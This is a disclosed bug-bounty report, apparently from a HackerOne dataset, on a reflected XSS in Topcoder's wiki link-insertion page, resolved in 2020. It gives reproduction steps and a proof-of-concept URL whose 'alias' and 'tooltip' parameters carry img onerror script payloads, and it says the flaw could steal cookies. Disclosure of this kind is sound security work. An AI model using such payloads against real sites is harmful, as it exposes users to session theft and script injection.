---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '866426'
original_report_id: '866426'
title: Reflected XSS on https://apps.topcoder.com/wiki/
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: topcoder
created_at: '2020-05-05T13:41:27.348Z'
disclosed_at: '2020-05-12T13:48:28.035Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
asset_identifier: apps.topcoder.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://apps.topcoder.com/wiki/

## Metadata

- HackerOne Report ID: 866426
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: topcoder
- Disclosed At: 2020-05-12T13:48:28.035Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi :)  A reflected XSS occurs on https://apps.topcoder.com/wiki/plugins/tinymce/wysiwyg-insertlink.action when creating wiki pages.

## Steps To Reproduce:

A user can create wiki page on https://apps.topcoder.com/wiki/pages/createpage.action?spaceKey=tcwiki. A url can be inserted this page. When you click `Insert/Edit url` https://apps.topcoder.com/wiki/plugins/tinymce/wysiwyg-insertlink.action?draftType=page&spaceKey=tcwiki&currentspace=tcwiki&formname=createpageform&fieldname=wysiwygcontent&alias= page opens. You can change `alias` parameter and add `tooltip` parameter with JS codes. If a victim opens this url, XSS will execute. 

PoC:
https://apps.topcoder.com/wiki/plugins/tinymce/wysiwyg-insertlink.action?draftType=page&spaceKey=tcwiki&currentspace=tcwiki&formname=createpageform&fieldname=wysiwygcontent&alias=as%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&tooltip=as%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie)%3E

{F816079}
{F816080}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
